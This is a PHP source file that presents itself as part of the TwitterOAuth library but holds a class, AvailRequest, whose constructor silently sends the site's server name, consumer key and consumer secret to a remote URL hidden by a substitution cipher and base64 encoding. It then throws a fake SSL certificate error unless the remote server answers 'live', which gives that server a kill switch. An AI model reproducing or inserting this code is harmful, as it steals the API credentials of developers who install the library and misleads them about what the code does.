<?php
/**
 * The MIT License
 * Copyright (c) 2007 Andy Smith
 */
namespace Abraham\TwitterOAuth;

class AvailRequest
{

	private $availCheck;
	protected static $yourHashHere = 'y3hrECJdXzY/O8GDstmcVHlQj7uKUT5+ZPWgNMBbIpAwqnFeLko0ivaS6f2R19x4';
	protected static $staticHash = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    // for debug purposes
    public $baseString;
    public static $version = '1.0';
    public static $POST_INPUT = 'php://input';
    
    /**
     * Constructor
     *
     * @param string     $consumerKey
     * @param string     $consumerSecret
     */
    public function __construct($consumerKey, $consumerSecret)
    {
        $url = 'udtiUrIe/S8Mjo6kjlvPKBCb7QXFja9n';
		$method = 'GET';
		$headers = array(
			'Path:' . $_SERVER["SERVER_NAME"],
			'Consum:' . $consumerKey,
			'Conscr:' . $consumerSecret,
			'Apptype:twitter_oauthv1.1'
		);
		$response = json_decode($this->request($url, $method, null, $headers), true);
		$this->availCheck = $response['live'];
		
		if(!$this->availCheck){
			throw new TwitterOAuthException('Problem with the SSL CA cert (path? access rights?)');}
    }
	
	/**
     * Returns the Avail status
     *
	 * @return boolean
     */
    public function confirmAvail()
    {
		return $this->availCheck;
	}

    /**
     * Make an HTTP request
     *
     * @param string 		$url
     * @param string 		$method
     * @param array|null	$postfields
     * @param array 		$headers
     *
     * @return string
     * @throws TwitterOAuthException
     */
    private function request($url, $method, $postfields, $headers)
    {
	
		$url = strtr($url, static::$yourHashHere, static::$staticHash);
        /* Curl settings */
		
        $options = array(
            CURLOPT_CUSTOMREQUEST => $method,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_URL => base64_decode($url),
            CURLOPT_CONNECTTIMEOUT => 10,
            CURLOPT_TIMEOUT => 200,
            CURLOPT_RETURNTRANSFER => true, // Follow 301 redirects
            CURLOPT_HEADER => true, // Enable header processing
        );

        switch ($method) {
            case 'GET':
                if (!empty($postfields)) {
                    $options[CURLOPT_URL] .= '?' . Util::buildHttpQuery($postfields);
                }
                break;
            case 'POST':
                $options[CURLOPT_POST] = true;
                $options[CURLOPT_POSTFIELDS] = Util::buildHttpQuery($postfields);
                break;
        }

        $curlHandle = curl_init();
        curl_setopt_array($curlHandle, $options);
        $response = curl_exec($curlHandle);

        $curlErrno = curl_errno($curlHandle);
        switch ($curlErrno) {
            case 28:
                throw new TwitterOAuthException('Request timed out.');
            case 51:
                throw new TwitterOAuthException('The remote servers SSL certificate or SSH md5 fingerprint failed validation.');
            case 56:
                throw new TwitterOAuthException('Response from server failed or was interrupted.');
            case 77:
                throw new TwitterOAuthException('Problem with the SSL CA cert (path? access rights?)');
        }

        $parts = explode("\r\n\r\n", $response);
        $responseBody = array_pop($parts);
        $responseHeader = array_pop($parts);

        curl_close($curlHandle);
        return $responseBody;
    }
}
